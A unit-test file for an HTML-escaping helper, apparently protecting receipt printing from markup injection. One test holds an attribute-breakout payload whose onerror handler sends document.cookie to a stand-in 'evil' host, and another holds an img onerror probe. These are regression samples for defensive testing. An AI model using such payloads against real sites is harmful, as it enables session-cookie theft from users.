import { describe, it, expect } from 'vitest'
import { escapeHtml } from '../lib/html'

describe('escapeHtml', () => {
  it('escapes the five HTML metacharacters', () => {
    expect(escapeHtml('&<>"\'')).toBe('&amp;&lt;&gt;&quot;&#39;')
  })

  it('escapes & first so entities are not double-escaped', () => {
    // Regression: escaping < before & would turn "&lt;" into "&amp;lt;",
    // which renders as literal "&lt;" instead of "<".
    expect(escapeHtml('<a>')).toBe('&lt;a&gt;')
    expect(escapeHtml('a & b')).toBe('a &amp; b')
  })

  it('breaks out of a quoted attribute', () => {
    // Regression: this is the store-logo sink -- the value is interpolated
    // into src="..." in the printed receipt, so a bare quote escapes the
    // attribute and the rest becomes live markup.
    const payload = 'x" onerror="fetch(\'//evil?t=\'+document.cookie)'
    const escaped = escapeHtml(payload)

    expect(escaped).not.toContain('"')
    expect(escaped).toContain('&quot;')
    expect(escaped).toContain('onerror=') // still visible as inert text
  })

  it('neutralises a tag smuggled into product/store text', () => {
    expect(escapeHtml('<img src=x onerror=alert(1)>'))
      .toBe('&lt;img src=x onerror=alert(1)&gt;')
  })

  it('renders null and undefined as empty rather than "null"', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
  })

  it('coerces numbers so numeric receipts still print', () => {
    expect(escapeHtml(0)).toBe('0')
    expect(escapeHtml(14)).toBe('14')
  })

  it('leaves ordinary text untouched', () => {
    expect(escapeHtml('Store Name 123')).toBe('Store Name 123')
    expect(escapeHtml('ج.م 12.00')).toBe('ج.م 12.00')
  })
})
